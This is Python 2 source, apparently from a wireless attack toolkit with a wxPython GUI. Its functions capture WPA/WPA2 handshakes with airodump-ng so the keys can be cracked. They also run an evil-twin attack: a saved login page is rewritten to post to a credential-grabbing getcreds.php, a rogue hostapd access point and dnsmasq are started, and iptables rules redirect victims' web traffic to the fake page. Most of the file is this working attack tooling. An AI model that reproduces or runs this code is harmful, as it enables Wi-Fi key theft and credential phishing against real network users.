        # ~ print "airodump-ng --essid '%s' --write 'capture/%s_crack' %s &"% (SSID, SSID, mon_iface)

        channelSearch = re.search('Channel: .*', channel)
        found_channel = channelSearch.group(0)

        mychannel = found_channel.replace('Channel: ', '').replace(']', '').strip()

        if 'mon0' not in wless_commands.get_net_devices():
            os.system('iw dev ' + self.nDeviceList.GetValue() + ' interface add mon0 type monitor')
            command = ("airodump-ng --essid '%s' --write './Modules/capture/%s_crack' %s -c %s &" % (
            SSID, SSID, self.nDeviceList.GetValue(), mychannel))
            print command

        else:
            monitoring_interface = 'mon0'
            command = ("airodump-ng --essid '%s' --write './Modules/capture/%s_crack' %s -c %s &" % (
            SSID, SSID, monitoring_interface, mychannel))

        logging.debug('WPA Crack command: %s', command)
        # ~ os.system("gnome-terminal -x airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack mon0")
        os.system(command)

    # os.system("airmon-ng stop mon0")
    # print str(SSID)
    # os.system("airmon-ng stop mon0")
    # ~ app_select = SSID

    # ~ def about(self, event):
    # ~ frm=MyHtmlFrame2(None, "About...")
    # ~ frm.Show()




    def attack_WPA2(self, e):
        sel = self.listbox.GetSelection()
        text = self.listbox.GetString(sel)
        cut_end = text.find(', BSS: ')
        app_select = text[:cut_end].replace('[SSID: ', '')

        reChannel = re.compile(r'primary channel: ')
        reChannel.search(text)

        channel_select = text.split(':', 1)[1][1:]

        ##### remove ['SSID:
        # self.evil_twin_attack(app_select)
        # print type(app_select)
        # print app_select
        self.wpa_crack_key(str(app_select), str(channel_select))

        # ~ def attack_W(self, e):
        # ~ sel = self.listbox.GetSelection()
        # ~ text = self.listbox.GetString(sel)
        # ~ text_split = str(text).split(', ')
        # ~ app_select = text_split[0].replace("['SSID:","").replace("'","").strip()
        # ~ ##### remove ['SSID:
        # ~ self.evil_twin_attack(app_select)

        # ~ def crack_wpa2_handshake(e):
        # ~ #sel = self.listbox.GetSelection()
        # def crack_wpa2_handshake(self,e):
        # ~ os.system("gnome-terminal -x aircrack-ng -w /usr/share/wordlists/fern-wifi/common.txt *.cap")




        ######## close the child frame

        self.Show(False)


class infernal_wireless(wx.Frame):
    def __init__(self, parent, id):
        wx.Frame.__init__(self, parent, id)

        panel = wx.Panel(self, -1)
        wx.StaticText(panel, -1,
                      'Currently, fully page download automation is not \nfully implemented.\nPlease save the login page as \n/var/www/login.html or /var/www/html/login.html and change permission to 755\n for all web contents you downloaded\nAnd press the button below to proceed to attack')
        ifcbtn = wx.Button(panel, label='Execute Infernal  ', pos=(20, 150))

        try:
            ifcbtn.Bind(wx.EVT_BUTTON, self.executeInfernal)
        except:
            wx.MessageBox(
                'Make sure to save the login page under Apache public folder\ni.e. /var/www/html or /var/www/',
                'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)

        self.bSoup = wx.TextCtrl(panel, -1, "", style=wx.TE_MULTILINE, pos=(30, 200), size=(500, 350))

        self.CreateStatusBar()
        # ~ menuBar = wx.MenuBar()
        # ~ menu = wx.Menu()
        # ~ menu.Append(99,  "&WPA2 Cracker", "Crack WPA/WPA2 handshakes")
        # ~ menuBar.Append(menu, "&Cracker")
        # ~ self.SetMenuBar(menuBar)
        # ~ self.Bind(wx.EVT_MENU, self.openfile, id=99)

        # ~ def openfile(self, event):


        # ~

    def executeInfernal(self, e):

        # if not os.path.exists('/var/www/html/login.html') or not os.path.exists('/var/www/html/login.html'):
        #     wx.MessageBox('Make sure to save the login page under Apache public folder\ni.e. /var/www/html or /var/www/',
        #                   'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)
        #     os.sytem('firefox &')


        def get_login_page():
            #


            httplib.HTTPConnection.debuglevel = 1
            request = urllib2.Request('http://localhost/login.html')
            opener = urllib2.build_opener(redirecthandle.SmartRedirectHandler())
            f = opener.open(request)
            ##article = re.sub(r'(?is)</html>.+', '</html>', article)
            redirect = f.url
            ##response = urllib2.urlopen('https://google.com')
            html = f.read()
            # print "Found the login page here: " + f.url
            ########## regex search and replace
            regex = re.search(r'action="([^"]*)".*?', html)
            post_action = str(regex.group(0))

            # ~ print "*" * 20
            # ~ print 'modifying the login page...'
            new_login = html.replace(post_action, 'action=getcreds.php')
            ##### create a login page
            index_page = open('/var/www/index2.html', 'wb')
            index_page.write(new_login)
            index_page.close()

            ############# MOFIYING THE POST SCRIPT

            myhtml = open('/var/www/index2.html', 'r')

            read_html = myhtml.read()

            myhtml.close()

            number = 0

            html_proc = BeautifulSoup(read_html)

            inputs = html_proc.findAll('input')
            panel = wx.Panel(self, -1)
            # wx.StaticText(panel, -1, '')

            # self.bSoup = wx.TextCtrl(panel, -1, "Please select the username and password from the form", style=wx.TE_MULTILINE,pos=(30, 200),size=(500,350))

            for i in inputs:
                print str(number) + ": " + str(i)
                number = number + 1
                self.bSoup.AppendText(str(number) + ": " + str(i) + "\n")

            def ask(parent=None, message='', default_value=''):
                dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
                dlg.ShowModal()
                result = dlg.GetValue()
                dlg.Destroy()
                return result

            # username_select = input('Please choose the username or email ID in numeric representation: ')


            user = str(ask(message='Enter Username')).strip()
            password = str(ask(message='Enter Password')).strip()
            ssid = str(ask(message='Enter the SSID')).strip()
            wlanInterface = str(ask(message='Enter the WLAN Interface Name')).strip()
            OutboundInterface = str(
                ask(message='Enter the Outbound Interface Name \nwhere Internet connection exists')).strip()

            tmp = read_html.replace('name="' + user + '"', 'name="username"').replace('name="' + password + '"',
                                                                                      'name="password"')

            new_page = open('/var/www/index.html', 'wb')
            new_page.write(tmp)
            new_page.close()
            os.system('firefox http://localhost/index.html &')
            time.sleep(3)

            iface = wless_commands.get_monitoring_interfaces()[0]

            # mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]
            hostapd = open('infernal-hostapd.conf', 'wb')
            # ~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
            config_file = "interface=" + iface + "\ndriver=nl80211\nssid=" + str(
                ssid) + "\nchannel=1\n#enable_karma=1\n"
            hostapd.write(config_file)
            hostapd.close()
            os.system("gnome-terminal -x hostapd infernal-hostapd.conf &")

            os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
			cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=%s
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""" % wlanInterface)

            print """sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
			cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=%s
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""" % wlanInterface

            os.system("service dnsmasq start")

            # ~ os.system("""ifconfig wlan0 up
            # ~ ifconfig wlan0 10.0.0.1/24
            # ~
            # ~ iptables -t nat -F
            # ~ iptables -F
            # ~ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
            # ~ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
            # ~ echo '1' > /proc/sys/net/ipv4/ip_forward""")
            # ~ print "finished the setup of nat"
            # ~ os.system("""ifconfig wlan0 up
            # ~ ifconfig wlan0 10.0.0.1/24
            # ~ iptables --flush
            # ~ iptables --table nat --flush
            # ~ iptables --delete-chain
            # ~ iptables --table nat --delete-chain
            # ~ echo 1 > /proc/sys/net/ipv4/ip_forward
            # ~ iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
            # ~ iptables --append FORWARD --in-interface at0 -j ACCEPT
            # ~ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
            # ~ iptables -t nat -A POSTROUTING -j MASQUERADE""")

            iface = wless_commands.get_monitoring_interfaces()[0]

            os.system("""ifconfig """ + iface + """ up
			ifconfig """ + iface + """ 10.0.0.1/24
			iptables --flush
			iptables --table nat --flush
			iptables --delete-chain
			iptables --table nat --delete-chain
			echo 1 > /proc/sys/net/ipv4/ip_forward
			iptables --table nat --append POSTROUTING --out-interface """ + OutboundInterface + """ -j MASQUERADE
			iptables --append FORWARD --in-interface at0 -j ACCEPT
			iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
			iptables -t nat -A POSTROUTING -j MASQUERADE""")
            print "finished the setup of nat"

        # ~ os.system("""ifconfig wlan0 up
        # ~ ifconfig wlan0 10.0.0.1/24
        # ~ iptables -t nat -F
        # ~ iptables -F
        # ~ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
        # ~ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
        # ~ echo '1' > /proc/sys/net/ipv4/ip_forward""")
        # ~ print "finished the setup of nat"

        try:
            get_login_page()
        except:
            wx.MessageBox(
                'Make sure to save the login page under Apache public folder\ni.e. /var/www/html or /var/www/',
                'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)


def main():
    ex = wx.App()
    Example(None)
    provider = wx.CreateFileTipProvider("./Modules/wiki/tips.txt", 0)
    wx.ShowTip(None, provider, True)
    ex.MainLoop()


if __name__ == '__main__':
    main()

